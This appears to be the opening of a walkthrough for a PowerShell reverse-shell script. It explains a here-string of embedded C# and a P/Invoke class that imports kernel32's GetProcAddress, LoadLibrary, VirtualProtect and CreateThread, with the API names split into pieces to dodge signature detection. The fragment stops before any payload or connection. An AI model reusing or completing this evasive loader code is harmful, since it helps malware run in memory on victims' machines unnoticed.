# Powershell_Rev_Scripts
## Explanation
# 1.
```powershell
$pythonmods = @"
using System;
using System.Runtime.InteropServices;
...
```
A variable called pythonmods is created and is a string that holds multiple lines of code emphasized by the '@"' or here strings. It includes the System and System.Runtime.InteropServices namespace.

# 2.
```powershell
public class K2 {
    [DllImport("kernel32", EntryPoint="Get" + "Proc" + "Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);
    [DllImport("kernel32", EntryPoint="Load" + "Library")]
    public static extern IntPtr ll(string name);
    [DllImport("kernel32", EntryPoint="Virtual" + "Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );
    ...
```
